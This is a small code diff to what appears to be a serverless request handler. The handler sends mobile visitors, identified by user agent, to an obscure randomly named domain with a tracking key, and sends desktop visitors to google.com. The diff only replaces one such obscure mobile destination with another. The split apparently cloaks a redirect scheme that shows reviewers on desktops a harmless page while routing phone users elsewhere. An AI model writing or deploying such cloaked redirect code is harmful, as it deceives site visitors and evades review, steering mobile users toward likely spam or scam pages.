@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://doledishinflict.com/v7jua9gy?key=81448fdf968136c8fbbae416a638ce98", 302);
+    return Response.redirect("https://valuationappeared.com/mdawwitafp?key=03b1144fc5f9e3669e42cf2b1d84f2f2", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
